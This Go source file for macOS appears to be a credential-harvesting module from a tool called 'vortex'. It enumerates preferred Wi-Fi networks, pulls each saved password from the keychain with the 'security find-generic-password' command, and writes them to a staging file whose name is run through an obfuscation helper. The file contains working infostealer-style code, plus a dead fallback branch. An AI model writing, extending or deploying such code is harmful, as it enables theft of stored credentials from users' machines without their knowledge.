//go:build darwin

package wifi

import (
    "os"
    "os/exec"
    "path/filepath"
    "strings"

    "github.com/olekukonko/tablewriter"
    "vortex/encrypt"
)

func DumpWifiPasswords(mainFolder string) error {
    wifiFile := filepath.Join(mainFolder, encrypt.B64Util("wifi-creds.txt", 0))
    f, err := os.Create(wifiFile)
    if err != nil {
        return err
    }
    defer f.Close()
    t := tablewriter.NewWriter(f)
    t.SetHeader([]string{"Wifi Profile Name", "Security", "Password"})
    // macOS: networksetup -listallhardwareports + security find-generic-password
    out, err := exec.Command("networksetup", "-listallhardwareports").Output()
    if err != nil {
        return err
    }
    // Best-effort: list preferred networks
    nets, _ := exec.Command("networksetup", "-listpreferredwirelessnetworks", "en0").Output()
    for _, line := range strings.Split(string(nets), "\n") {
        ssid := strings.TrimSpace(line)
        if ssid == "" || strings.Contains(ssid, "Preferred") {
            continue
        }
        // Try keychain
        kp, _ := exec.Command("security", "find-generic-password", "-wa", ssid).Output()
        pass := strings.TrimSpace(string(kp))
        if pass == "" {
            pass = "<no-access>"
        }
        t.Append([]string{ssid, "WPA2", pass})
    }
    // Fallback if no hardware
    if strings.Contains(string(out), "Hardware Port") && t != nil {
        // already handled
    }
    t.Render()
    return nil
}
